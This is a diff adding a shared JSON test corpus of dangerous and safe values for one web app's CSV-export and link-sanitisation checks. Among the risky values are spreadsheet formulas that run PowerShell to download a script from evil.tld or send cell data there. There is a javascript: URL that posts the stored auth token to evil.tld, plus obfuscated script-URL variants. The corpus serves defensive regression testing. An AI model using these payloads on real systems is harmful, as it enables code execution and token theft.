@@ -1,0 +1,134 @@
+{
+  "_README": "ONE shared attack/regression corpus for the 2026-08-05 export-XSS-upload package. Read by BOTH backend/harness_export_xss_upload.py and frontend/prove_export_xss_upload.mjs, so the two runtimes can never drift on what counts as dangerous. Adding a vector here tightens both at once.",
+  "formula_risky": {
+    "_note": "Values a spreadsheet would EVALUATE. Must be neutralised in every export path.",
+    "vectors": [
+      "=1+1",
+      "=cmd|'/C calc'!A0",
+      "=cmd|'/c powershell IEX(wget http://evil.tld/s.ps1)'!A0",
+      "=IMPORTXML(CONCAT(\"http://evil.tld/?v=\",A2),\"//a\")",
+      "=HYPERLINK(\"http://evil.tld/?x=\"&A2,\"Commission detail\")",
+      "=WEBSERVICE(\"http://evil.tld/?\"&A1)",
+      "=1+1+cmd|'/C calc'!A0",
+      "@SUM(1+1)*cmd|'/C calc'!A0",
+      "+1+1|'/C calc'!A0",
+      "-2+3+cmd|'/C calc'!A0",
+      "\t=1+1",
+      "\r=1+1",
+      "\n=1+1",
+      "@import",
+      "+1 (555) 123-4567",
+      "-Adjustment",
+      "-- credit memo",
+      "=A1",
+      "@"
+    ]
+  },
+  "formula_safe": {
+    "_note": "ANTI-REGRESSION. Ordinary business data that merely LOOKS risky. A naive apostrophe-prefix fix corrupts every one of these - they must survive an export byte-for-byte AND still open as the right type in Excel.",
+    "vectors": [
+      "-1234.56",
+      "-1,234.56",
+      "-$1,234.56",
+      "-0.5",
+      "-99",
+      "+250",
+      "+1234.00",
+      "-3.5%",
+      "1e5",
+      "-1.5e-3",
+      "2026-08-06",
+      "08/06/2026",
+      "Aug 6, 2026",
+      "1234.56",
+      "0",
+      "",
+      "Boost Mobile - Jamaica Ave",
+      "M2-M12",
+      "N/A",
+      "Store #12 (Queens)",
+      "sanjot@cellfonzrus.com",
+      "5551234567"
+    ]
+  },
+  "href_unsafe": {
+    "_note": "H6. Must NEVER be stored, and must NEVER be rendered as a link target.",
+    "vectors": [
+      "javascript:alert(document.cookie)",
+      "javascript:fetch('https://evil.tld/?t='+localStorage.getItem('sb-auth-token'))",
+      "JaVaScRiPt:alert(1)",
+      "JAVASCRIPT:alert(1)",
+      "  javascript:alert(1)",
+      "java\tscript:alert(1)",
+      "java\nscript:alert(1)",
+      "java\rscript:alert(1)",
+      "\u0001javascript:alert(1)",
+      "\u0000javascript:alert(1)",
+      "javascript\t:alert(1)",
+      "&#106;avascript:alert(1)",
+      "&#x6a;avascript:alert(1)",
+      "&#0000106;avascript:alert(1)",
+      "vbscript:msgbox(1)",
+      "VBScript:msgbox(1)",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "data:text/html,<script>alert(1)</script>",
+      "//evil.tld/steal",
+      "//evil.tld",
+      "file:///app/.env",
+      "chrome://settings"
+    ]
+  },
+  "href_safe": {
+    "_note": "ANTI-REGRESSION. Every real deep-link shape in this product, plus what an admin may reasonably type. Must come back BYTE-IDENTICAL.",
+    "vectors": [
+      "/admin/roles",
+      "/commcalc/upload",
+      "/commcalc/reports?tab=gp&period=2026-07",
+      "/closing/envelope-payout",
+      "/accounts/pl",
+      "/commcalc/asset/dashboard",
+      "/commcalc/daily-commission",
+      "/admin/import-health#feeds",
+      "?period=2026-07",
+      "#top",
+      "commcalc/upload",
+      "https://metricspro-five.vercel.app/commcalc",
+      "http://localhost:3000/admin",
+      "HTTPS://METRICSPRO-FIVE.VERCEL.APP/x",
+      "mailto:sanjot@cellfonzrus.com",
+      "mailto:reports@metricspro.tech?subject=Report",
+      "tel:+15551234567",
+      "/commcalc/store/1234 Main St",
+      "/reports/a:b"
+    ]
+  },
+  "navigation_blocked": {
+    "_note": "The app-wide click net (UnsafeLinkGuard) deny-list.",
+    "vectors": [
+      "javascript:alert(1)",
+      "JaVaScRiPt:alert(1)",
+      "java\tscript:alert(1)",
+      "\u0001javascript:alert(1)",
+      "&#106;avascript:alert(1)",
+      "vbscript:msgbox(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "data:image/svg+xml,<svg onload=alert(1)>"
+    ]
+  },
+  "navigation_allowed": {
+    "_note": "ANTI-REGRESSION for the click net. These are REAL, WORKING links in this app today - a blanket allow-list would break every one of them (the commcalc CSV exports click a synthesised data: anchor; generated downloads use blob:).",
+    "vectors": [
+      "/commcalc/reports",
+      "https://metricspro-production.up.railway.app/api/v1/notify/download/abc",
+      "mailto:sanjot@cellfonzrus.com",
+      "tel:+15551234567",
+      "#top",
+      "?tab=1",
+      "data:text/csv;charset=utf-8,Store%2CAmount%0AJamaica%2C123.45",
+      "data:text/csv,a,b",
+      "blob:https://metricspro-five.vercel.app/2f0e1a7c-1111-2222-3333-444455556666",
+      "data:application/pdf;base64,JVBERi0x",
+      "https://maps.google.com/?q=40.7,-73.8"
+    ]
+  }
+}
